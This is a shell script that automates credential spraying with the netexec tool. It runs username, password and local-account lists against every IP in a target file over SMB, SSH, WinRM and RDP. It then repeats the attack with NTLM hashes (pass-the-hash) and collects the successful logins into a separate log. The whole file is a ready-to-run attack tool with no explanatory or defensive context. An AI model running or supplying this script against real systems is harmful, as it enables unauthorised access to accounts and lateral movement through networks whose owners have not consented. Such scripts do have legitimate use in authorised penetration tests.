#!/bin/sh
echo "" > netexec.log
netexec smb ips.txt -u users.txt -p passwords.txt --continue-on-success  | tee netexec.log
netexec smb ips.txt -u users_local.txt -p passwords.txt  --continue-on-success --local-auth  | tee -a netexec.log
netexec ssh ips.txt -u users.txt -p passwords.txt --continue-on-success  | tee -a netexec.log
netexec ssh ips.txt -u users_local.txt -p passwords.txt  --continue-on-success  | tee -a netexec.log
netexec winrm ips.txt -u users.txt -p passwords.txt --continue-on-success  | tee -a netexec.log
netexec winrm ips.txt -u users_local.txt -p passwords.txt  --continue-on-success --local-auth  | tee -a netexec.log
netexec rdp ips.txt -u users.txt -p passwords.txt --continue-on-success  | tee -a netexec.log
netexec rdp ips.txt -u users_local.txt -p passwords.txt  --continue-on-success --local-auth  | tee -a netexec.log

grep "[+]" netexec.log > netexec_success.log

netexec smb ips.txt -u users.txt -H hashes.txt --continue-on-success  | tee -a netexec.log
netexec smb ips.txt -u users_local.txt -H hashes.txt   --continue-on-success --local-auth  | tee -a netexec.log
netexec winrm ips.txt -u users.txt -H hashes.txt  --continue-on-success  | tee -a netexec.log
netexec winrm ips.txt -u users_local.txt -H hashes.txt  --continue-on-success --local-auth  | tee -a netexec.log
netexec rdp ips.txt -u users.txt -H hashes.txt  --continue-on-success  | tee -a netexec.log
netexec rdp ips.txt -u users_local.txt -H hashes.txt  --continue-on-success --local-auth  | tee -a netexec.log

grep "[+]" netexec.log >> netexec_success.log
